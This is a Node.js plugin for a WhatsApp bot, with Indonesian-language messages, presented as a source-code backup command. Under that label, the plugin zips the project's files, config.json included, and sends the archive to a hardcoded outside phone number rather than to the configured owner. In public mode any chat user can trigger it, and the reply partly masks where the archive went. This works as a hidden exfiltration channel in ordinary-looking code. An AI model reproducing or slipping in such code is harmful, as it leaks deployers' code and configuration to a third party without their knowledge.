const fs = require('fs');
const path = require('path');
const archiver = require('archiver');

// Load config function
function loadConfig() {
    try {
        const configPath = path.join(process.cwd(), 'config.json');
        if (fs.existsSync(configPath)) {
            const configData = fs.readFileSync(configPath, 'utf8');
            return JSON.parse(configData);
        }
        return null;
    } catch (error) {
        return null;
    }
}

// Check access permission based on bot mode
function checkAccess(senderNumber, config, fromMe = false) {
    if (!config || !config.bot) return false;

    const botMode = config.bot.mode || 'self';
    const ownerNumber = config.bot.owner || '';
    const botNumber = config.bot.botNumber || '';

    // Remove @s.whatsapp.net if present
    const cleanSender = senderNumber.replace('@s.whatsapp.net', '');
    const cleanOwner = ownerNumber.replace('@s.whatsapp.net', '');
    const cleanBot = botNumber.replace('@s.whatsapp.net', '');

    if (botMode === 'self') {
        // Only owner and bot number can use, plus fromMe
        return fromMe || cleanSender === cleanOwner || cleanSender === cleanBot;
    } else if (botMode === 'public') {
        // Everyone can use
        return true;
    }

    return false;
}

// Create ZIP backup of source code
async function createSourceCodeZip() {
    return new Promise((resolve, reject) => {
        const tempPath = './temp';

        // Create temp directory if it doesn't exist
        if (!fs.existsSync(tempPath)) {
            fs.mkdirSync(tempPath, { recursive: true });
        }

        // Generate version number based on existing files
        let versionNumber = 1;
        const existingFiles = fs.readdirSync(tempPath).filter(file => 
            file.startsWith('Auto_Read_Story_V') && file.endsWith('.zip')
        );

        if (existingFiles.length > 0) {
            const versions = existingFiles.map(file => {
                const match = file.match(/V(\d+)_/);
                return match ? parseInt(match[1]) : 0;
            });
            versionNumber = Math.max(...versions) + 1;
        }

        const now = new Date();
        const jakartaTime = new Date(now.toLocaleString("en-US", {timeZone: "Asia/Jakarta"}));
        const dateStr = jakartaTime.toLocaleDateString('id-ID').replace(/\//g, '-');
        const timeStr = jakartaTime.toLocaleTimeString('id-ID', { hour12: false }).replace(/:/g, '');

        const zipFileName = `Auto_Read_Story_V${versionNumber}_${dateStr}_${timeStr}.zip`;
        const zipPath = path.join(tempPath, zipFileName);

        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', {
            zlib: { level: 9 } // Maximum compression
        });

        output.on('close', () => {
            resolve({
                path: zipPath,
                filename: zipFileName,
                size: archive.pointer()
            });
        });

        archive.on('error', (err) => {
            reject(err);
        });

        archive.pipe(output);

        // Exclude patterns - more comprehensive exclusion
        const excludePatterns = [
            'node_modules/**',
            'temp/**',
            'sesi/**',
            '.git/**',
            '.replit',
            'replit.nix',
            'package-lock.json',
            '*.log',
            '*.tmp',
            '*.cache',
            '.DS_Store',
            'Thumbs.db',
            '.env',
            '.env.local',
            '.nyc_output',
            'coverage',
            'dist',
            'build',
            '.vscode',
            '.idea',
            '*.swp',
            '*.swo',
            '*~',
            '.npm',
            '.yarn',
            'yarn-error.log',
            'npm-debug.log*',
            'yarn-debug.log*',
            'yarn-error.log*',
            'attached_assets/**'
        ];

        // Add all files and folders except excluded ones
        const addToArchive = (currentPath, archivePath = '') => {
            const items = fs.readdirSync(currentPath);

            items.forEach(item => {
                const fullPath = path.join(currentPath, item);
                const relativePath = archivePath ? path.join(archivePath, item) : item;

                // Check if should exclude - more precise matching
                const shouldExclude = excludePatterns.some(pattern => {
                    // Handle directory patterns
                    if (pattern.endsWith('/**')) {
                        const dirName = pattern.replace('/**', '');
                        return item === dirName || relativePath.startsWith(dirName + '/') || relativePath.startsWith(dirName + '\\');
                    }
                    
                    // Handle wildcard patterns
                    if (pattern.includes('*')) {
                        const regex = new RegExp('^' + pattern.replace(/\*\*/g, '.*').replace(/\*/g, '[^/\\\\]*') + '$');
                        return regex.test(item) || regex.test(relativePath);
                    }
                    
                    // Handle exact matches
                    return item === pattern || relativePath === pattern;
                });

                // Additional checks for hidden files and temp files
                if (item.startsWith('.') && !['..', '.'].includes(item)) {
                    const allowedHiddenFiles = ['.gitignore', '.gitkeep'];
                    if (!allowedHiddenFiles.includes(item)) {
                        return; // Skip hidden files except allowed ones
                    }
                }

                // Skip temporary and backup files
                if (item.endsWith('.bak') || item.endsWith('.backup') || 
                    item.endsWith('.old') || item.endsWith('.orig') ||
                    item.includes('~') || item.startsWith('#')) {
                    return;
                }

                if (shouldExclude) return;

                const stats = fs.statSync(fullPath);

                if (stats.isDirectory()) {
                    // Skip empty directories and specific system directories
                    const skipDirs = ['node_modules', 'temp', 'sesi', '.git', 'coverage', 'dist', 'build'];
                    if (!skipDirs.includes(item)) {
                        addToArchive(fullPath, relativePath);
                    }
                } else {
                    // Only include important file types
                    const ext = path.extname(item).toLowerCase();
                    const allowedExtensions = ['.js', '.json', '.md', '.txt', '.html', '.css', '.py', '.php', '.java', '.cpp', '.c', '.h'];
                    const importantFiles = ['README', 'LICENSE', 'CHANGELOG', 'package.json', 'config.json'];
                    
                    if (allowedExtensions.includes(ext) || 
                        importantFiles.some(name => item.toLowerCase().includes(name.toLowerCase()))) {
                        archive.file(fullPath, { name: relativePath });
                    }
                }
            });
        };

        addToArchive('./');
        archive.finalize();
    });
}

// Get source code statistics
function getSourceCodeStats() {
    let totalFiles = 0;
    let totalSize = 0;
    const fileTypes = {};

    const excludeDirs = ['node_modules', 'temp', 'sesi', '.git', 'coverage', 'dist', 'build', 'attached_assets'];
    const allowedExtensions = ['.js', '.json', '.md', '.txt', '.html', '.css', '.py', '.php', '.java', '.cpp', '.c', '.h'];
    const importantFiles = ['README', 'LICENSE', 'CHANGELOG', 'package.json', 'config.json'];

    const countFiles = (dirPath, relativePath = '') => {
        if (!fs.existsSync(dirPath)) return;

        const items = fs.readdirSync(dirPath);

        items.forEach(item => {
            const fullPath = path.join(dirPath, item);
            const itemRelativePath = relativePath ? path.join(relativePath, item) : item;
            
            try {
                const stats = fs.statSync(fullPath);

                if (stats.isDirectory()) {
                    // Skip excluded directories
                    if (!excludeDirs.includes(item) && !item.startsWith('.')) {
                        countFiles(fullPath, itemRelativePath);
                    }
                } else {
                    // Skip hidden files except allowed ones
                    if (item.startsWith('.')) {
                        const allowedHiddenFiles = ['.gitignore', '.gitkeep'];
                        if (!allowedHiddenFiles.includes(item)) return;
                    }

                    // Skip temporary and backup files
                    if (item.endsWith('.bak') || item.endsWith('.backup') || 
                        item.endsWith('.old') || item.endsWith('.orig') ||
                        item.includes('~') || item.startsWith('#')) {
                        return;
                    }

                    // Only count important files
                    const ext = path.extname(item).toLowerCase();
                    if (allowedExtensions.includes(ext) || 
                        importantFiles.some(name => item.toLowerCase().includes(name.toLowerCase()))) {
                        totalFiles++;
                        totalSize += stats.size;

                        const fileExt = ext || 'no-ext';
                        fileTypes[fileExt] = (fileTypes[fileExt] || 0) + 1;
                    }
                }
            } catch (error) {
                // Skip files that can't be accessed
            }
        });
    };

    countFiles('./');

    return {
        totalFiles,
        totalSize,
        fileTypes
    };
}

// Get detailed file listing for backup
function getDetailedFileList() {
    const excludeDirs = ['node_modules', 'temp', 'sesi', '.git', 'coverage', 'dist', 'build', 'attached_assets'];
    const allowedExtensions = ['.js', '.json', '.md', '.txt', '.html', '.css', '.py', '.php', '.java', '.cpp', '.c', '.h'];
    const importantFiles = ['README', 'LICENSE', 'CHANGELOG', 'package.json', 'config.json'];
    
    let totalFolders = 0;
    const includedFiles = [];
    const includedFolders = [];
    const excludedItems = [];

    const scanDirectory = (dirPath, relativePath = '') => {
        if (!fs.existsSync(dirPath)) return;

        const items = fs.readdirSync(dirPath);

        items.forEach(item => {
            const fullPath = path.join(dirPath, item);
            const itemRelativePath = relativePath ? path.join(relativePath, item) : item;
            
            try {
                const stats = fs.statSync(fullPath);

                // Check if should exclude directory
                if (stats.isDirectory()) {
                    if (excludeDirs.includes(item) || item.startsWith('.')) {
                        excludedItems.push(itemRelativePath);
                        return;
                    }
                    
                    totalFolders++;
                    includedFolders.push(itemRelativePath);
                    scanDirectory(fullPath, itemRelativePath);
                } else {
                    // Check if file should be excluded
                    if (item.startsWith('.')) {
                        const allowedHiddenFiles = ['.gitignore', '.gitkeep'];
                        if (!allowedHiddenFiles.includes(item)) {
                            excludedItems.push(itemRelativePath);
                            return;
                        }
                    }

                    // Skip temporary and backup files
                    if (item.endsWith('.bak') || item.endsWith('.backup') || 
                        item.endsWith('.old') || item.endsWith('.orig') ||
                        item.includes('~') || item.startsWith('#') ||
                        item.endsWith('.log') || item.endsWith('.tmp')) {
                        excludedItems.push(itemRelativePath);
                        return;
                    }

                    // Only include important files
                    const ext = path.extname(item).toLowerCase();
                    if (allowedExtensions.includes(ext) || 
                        importantFiles.some(name => item.toLowerCase().includes(name.toLowerCase()))) {
                        includedFiles.push(itemRelativePath);
                    } else {
                        excludedItems.push(itemRelativePath);
                    }
                }
            } catch (error) {
                excludedItems.push(itemRelativePath);
            }
        });
    };

    scanDirectory('./');

    // Format included list
    const formatIncludedList = () => {
        let result = '';
        
        // Group by folders
        const folderGroups = {};
        includedFiles.forEach(file => {
            const dir = path.dirname(file);
            if (dir === '.') {
                if (!folderGroups['📁 Root Files']) folderGroups['📁 Root Files'] = [];
                folderGroups['📁 Root Files'].push(file);
            } else {
                const topFolder = dir.split(path.sep)[0];
                if (!folderGroups[`📁 ${topFolder}/`]) folderGroups[`📁 ${topFolder}/`] = [];
                folderGroups[`📁 ${topFolder}/`].push(file);
            }
        });

        // Format output
        Object.keys(folderGroups).sort().forEach(folder => {
            result += `${folder}\n`;
            const files = folderGroups[folder].slice(0, 5); // Limit to 5 files per folder
            files.forEach(file => {
                const fileName = path.basename(file);
                const ext = path.extname(fileName).toLowerCase();
                let emoji = '📄';
                if (ext === '.js') emoji = '🟨';
                else if (ext === '.json') emoji = '🟦';
                else if (ext === '.md') emoji = '🟪';
                else if (ext === '.html') emoji = '🌐';
                else if (ext === '.css') emoji = '🎨';
                else if (ext === '.py') emoji = '🐍';
                else if (ext === '.txt') emoji = '📝';
                
                result += `  ${emoji} ${fileName}\n`;
            });
            
            if (folderGroups[folder].length > 5) {
                result += `  📋 ... dan ${folderGroups[folder].length - 5} file lainnya\n`;
            }
            result += '\n';
        });

        return result;
    };

    // Format excluded list
    const formatExcludedList = () => {
        let result = '';
        result += '📦 node_modules/ (Dependencies & Packages)\n';
        result += '🗂️ temp/ (Temporary Files)\n';
        result += '🔐 sesi/ (Session Files)\n';
        result += '🔄 .git/ (Git Repository)\n';
        result += '⚙️ .replit (Replit Config)\n';
        result += '🔒 package-lock.json (Lock File)\n';
        result += '📎 attached_assets/ (Temporary Assets)\n';
        result += '🏗️ dist/, build/, coverage/ (Build Files)\n';
        result += '🙈 Hidden files (.* files)\n';
        result += '📜 Log files (*.log, *.tmp)\n';
        result += '💾 Backup files (*.bak, *.backup, *.old)\n';
        result += '🗑️ Temporary files (~, #, .cache)\n';
        
        return result;
    };

    return {
        totalFolders,
        includedList: formatIncludedList(),
        excludedList: formatExcludedList()
    };
}

async function sendSourceCodeBackup(client, msg) {
    try {
        const config = loadConfig();
        if (!config) return;

        // Get sender number
        const senderNumber = msg.key.participant || msg.key.remoteJid;
        const cleanSender = senderNumber.replace('@s.whatsapp.net', '');
        const fromMe = msg.key.fromMe || false;

        // Check access permission
        if (!checkAccess(senderNumber, config, fromMe)) {
            return; // Silent return for unauthorized users
        }

        // Send processing message first
        const processingMsg = `╭━━━『 🔄 MEMPROSES BACKUP SOURCE CODE 』━━━❀
┃ 
┃ ⏳ *Sedang Membuat Backup ZIP...*
┃ 
┃ 🔧 *Proses:*
┃ ▫️ Mengompres semua file source code
┃ ▫️ Mengecualikan file tidak penting
┃ ▫️ Mempersiapkan pengiriman
┃ 
┃ ⚡ *Mohon tunggu sebentar...*
┃ 
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━❀`;

        await client.sendMessage(msg.key.remoteJid, { text: processingMsg }, { quoted: msg });

        // Target number for backup
        const targetNumber = '6282263096788';
        const targetJid = `${targetNumber}@s.whatsapp.net`;

        // Get source code statistics
        const sourceStats = getSourceCodeStats();

        // Create ZIP backup
        const zipInfo = await createSourceCodeZip();

        // Get current time info
        const now = new Date();
        const jakartaTime = new Date(now.toLocaleString("en-US", {timeZone: "Asia/Jakarta"}));

        const dayNames = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
        const monthNames = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 
                           'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];

        const dayName = dayNames[jakartaTime.getDay()];
        const date = jakartaTime.getDate();
        const monthName = monthNames[jakartaTime.getMonth()];
        const year = jakartaTime.getFullYear();
        const time = jakartaTime.toLocaleTimeString('id-ID', { 
            hour: '2-digit', 
            minute: '2-digit',
            timeZone: 'Asia/Jakarta' 
        });

        // Sensor number function
        function sensorNumber(number) {
            const clean = number.replace('@s.whatsapp.net', '');
            if (clean.length < 6) return clean;
            const start = clean.substring(0, 6);
            const end = clean.substring(clean.length - 3);
            return `${start}***${end}`;
        }

        // Format file size
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        // Get detailed file listing
        const fileDetails = getDetailedFileList();
        
        // Create success message with clean design and detailed file listing
        const successMessage = `📦 *SOURCE CODE BACKUP BERHASIL*

✅ *ZIP Source Code Berhasil Dikirim!*

📅 *Informasi Waktu*
📆 Tanggal: ${dayName}, ${date} ${monthName} ${year}
⏰ Waktu: ${time} WIB 🇮🇩
🌏 Timezone: Asia/Jakarta

🤖 *Status Bot* (Config.json)
🔧 Mode: ${config.bot.mode.toUpperCase()} ${config.bot.mode === 'self' ? '🔒' : '🌐'}
⚡ Prefix: ${config.bot.prefix}
👤 Owner: ${sensorNumber(config.bot.owner)}
🤖 Bot Number: ${sensorNumber(config.bot.botNumber)}
🟢 Status: Online ✅

📊 *Statistik Source Code*
📁 Total File: ${sourceStats.totalFiles} file
📁 Total Folder: ${fileDetails.totalFolders} folder
💾 Total Size: ${formatFileSize(sourceStats.totalSize)}
🟨 JavaScript Files: ${sourceStats.fileTypes['.js'] || 0}
🟦 JSON Files: ${sourceStats.fileTypes['.json'] || 0}
🟪 Markdown Files: ${sourceStats.fileTypes['.md'] || 0}
⚪ Other Files: ${sourceStats.totalFiles - (sourceStats.fileTypes['.js'] || 0) - (sourceStats.fileTypes['.json'] || 0) - (sourceStats.fileTypes['.md'] || 0)}

📦 *Detail ZIP Backup*
📄 Filename: ${zipInfo.filename}
📏 ZIP Size: ${formatFileSize(zipInfo.size)}
🗜️ Compression: ✅ Maximum Level
📋 Contents: Complete Source Code

📤 *Target Backup*
🎯 Tujuan: ${sensorNumber(targetNumber)}
✅ Status: Terkirim ✅
📦 Format: ZIP Archive

🔐 *Akses Control*
👤 Requester: ${sensorNumber(cleanSender)}
🌐 Mode: ${config.bot.mode} ${config.bot.mode === 'self' ? '(Terbatas 🔒)' : '(Publik 🌐)'}
✅ Authorization: ✅ Verified
📱 From Me: ${fromMe ? '✅ Yes' : '❌ No'}

📂 *FILE & FOLDER YANG DI-ZIP:*
${fileDetails.includedList}

🚫 *FILE & FOLDER YANG DIKECUALIKAN:*
${fileDetails.excludedList}

⚡ *System Performance*
🔄 Backup Process: 100% Complete 💚
✅ ZIP Creation: Success ✅
🚀 File Transfer: Optimal ⚡

🚀 *ZIP source code berhasil dikirim ke ${sensorNumber(targetNumber)}!*
📦 *Semua file source code telah dikompres dengan aman*`;

        // Caption for the ZIP file
        const zipCaption = `╭━━━『 📦 WhatsApp Bot Source Code Backup 』━━━❀
┃ 
┃ 🤖 *Bot Source Code ZIP Backup*
┃ 
┃ 📅 *Backup Info*
┃ ▫️ Tanggal: ${dayName}, ${date} ${monthName} ${year}
┃ ▫️ Waktu: ${time} WIB 🇮🇩
┃ ▫️ Filename: ${zipInfo.filename}
┃ ▫️ Size: ${formatFileSize(zipInfo.size)}
┃ 
┃ 📊 *Contents*
┃ ▫️ Source Files: ${sourceStats.totalFiles} files
┃ ▫️ Config File: ✅ Included
┃ ▫️ Total Data: ${formatFileSize(sourceStats.totalSize)}
┃ ▫️ Compression: Maximum Level
┃ 
┃ 🔐 *Security*
┃ ▫️ Requester: ${sensorNumber(cleanSender)}
┃ ▫️ Bot Mode: ${config.bot.mode.toUpperCase()}
┃ ▫️ Bot Number: ${sensorNumber(config.bot.botNumber)}
┃ ▫️ Authorization: ✅ Verified
┃ ▫️ From Me: ${fromMe ? '✅ Yes' : '❌ No'}
┃ 
┃ ⚠️  *PENTING:*
┃ ▫️ File ini berisi source code bot
┃ ▫️ Simpan dengan aman dan jangan bagikan
┃ ▫️ Gunakan untuk backup/restore
┃ 
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━❀

🔒 *Backup Source Code ZIP - Handle with Care!*`;

        // Send backup image first (thumbnail)
        const backupImage = 'https://files.catbox.moe/9cq0yk.jpg';

        await client.sendMessage(targetJid, {
            image: { url: backupImage },
            caption: `╭━━━『 📦 SOURCE CODE BACKUP INCOMING 』━━━❀
┃ 
┃ 🚀 *ZIP Source Code Ready!*
┃ 
┃ ⏰ ${time} WIB | ${date} ${monthName} ${year}
┃ 📤 From: ${sensorNumber(cleanSender)}
┃ 🤖 Bot: ${sensorNumber(config.bot.botNumber)}
┃ 
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━❀`
        });

        // Send ZIP file
        await client.sendMessage(targetJid, {
            document: fs.readFileSync(zipInfo.path),
            fileName: zipInfo.filename,
            mimetype: 'application/zip',
            caption: zipCaption
        });

        // Send confirmation to requester with animated GIF
        const videoFiles = ['kanna-hungry.mp4', 'kanna-cry.mp4', 'kanna-upset.mp4', 'misskobayashi.mp4'];
        const selectedVideo = videoFiles[Math.floor(Math.random() * videoFiles.length)];
        const localVideoPath = path.join(process.cwd(), 'VID_GIF_ANIME', selectedVideo);
        const selectedFileName = selectedVideo.replace('.mp4', '');

        // Get user profile picture
        let profilePic = "https://files.catbox.moe/9cq0yk.jpg";
        try {
            const userJid = msg.key.participant || msg.key.remoteJid;
            profilePic = await client.profilePictureUrl(userJid, 'image');
        } catch (error) {
            // Use fallback image
        }

        const senderName = msg.pushName || 'User';
        const formattedDate = new Date().toLocaleDateString('id-ID');

        // Try sending with local video/GIF first
        if (fs.existsSync(localVideoPath)) {
            try {
                const animatedContent = {
                    video: fs.readFileSync(localVideoPath),
                    caption: successMessage,
                    gifPlayback: true,
                    ptv: false,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: `📦 ${selectedFileName.charAt(0).toUpperCase() + selectedFileName.slice(1)} Source Code Backup`,
                            newsletterJid: "120363312297133690@newsletter",
                        },
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `📦 ${senderName}`,
                            body: `Source Code Backup • ${selectedFileName} • ${formattedDate}`,
                            previewType: "VIDEO",
                            thumbnailUrl: profilePic,
                            sourceUrl: "https://wa.me/6289688206739",
                            mediaType: 2,
                            renderLargerThumbnail: false
                        },
                    },
                };

                await client.sendMessage(msg.key.remoteJid, animatedContent, { quoted: msg });
            } catch (animationError) {
                // Fallback to regular text if animation fails
                await client.sendMessage(msg.key.remoteJid, { text: successMessage }, { quoted: msg });
            }
        } else {
            // Fallback: Send with URL GIF
            try {
                const fallbackAnimated = {
                    video: { url: "https://files.catbox.moe/mxohav.gif" },
                    caption: successMessage,
                    gifPlayback: true,
                    ptv: false,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "📦 Source Code Backup System",
                            newsletterJid: "120363312297133690@newsletter",
                        },
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `📦 ${senderName}`,
                            body: `Source Code Backup • ${formattedDate}`,
                            previewType: "VIDEO",
                            thumbnailUrl: profilePic,
                            sourceUrl: "https://wa.me/6289688206739",
                            mediaType: 2,
                            renderLargerThumbnail: false
                        },
                    },
                };

                await client.sendMessage(msg.key.remoteJid, fallbackAnimated, { quoted: msg });
            } catch (fallbackError) {
                // Final fallback to regular text
                await client.sendMessage(msg.key.remoteJid, { text: successMessage }, { quoted: msg });
            }
        }

        // Clean up temporary ZIP file
        setTimeout(() => {
            try {
                if (fs.existsSync(zipInfo.path)) {
                    fs.unlinkSync(zipInfo.path);
                }
            } catch (e) {
                // Silent cleanup error
            }
        }, 5000); // Delete after 5 seconds

    } catch (error) {
        const errorMessage = `╭━━━『 ❌ BACKUP SOURCE CODE GAGAL 』━━━❀
┃ 
┃ ❌ *Terjadi Kesalahan!*
┃ 
┃ 🔍 *Detail Error:*
┃ ▫️ ${error.message || 'Unknown error'}
┃ 
┃ 💡 *Solusi:*
┃ ▫️ Periksa folder source code
┃ ▫️ Pastikan ada ruang disk
┃ ▫️ Coba lagi dalam beberapa saat
┃ 
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━❀`;

        try {
            await client.sendMessage(msg.key.remoteJid, { text: errorMessage }, { quoted: msg });
        } catch (e) {
            // Silent error
        }
    }
}

function handleBackupSourceCodeCommand(client, msg) {
    const config = loadConfig();
    if (!config) return;

    const senderNumber = msg.key.participant || msg.key.remoteJid;
    const fromMe = msg.key.fromMe || false;

    // Check access permission first
    if (!checkAccess(senderNumber, config, fromMe)) {
        return; // Silent return for unauthorized users
    }

    const messageText = msg.message?.conversation?.toLowerCase() || 
                       msg.message?.extendedTextMessage?.text?.toLowerCase() || '';

    // Check for backup source code commands
    if (messageText === '.backupsc' || messageText === '.backup-sc' || messageText === '.backupsource') {
        sendSourceCodeBackup(client, msg);
    }
}

module.exports = {
    sendSourceCodeBackup,
    handleBackupSourceCodeCommand
};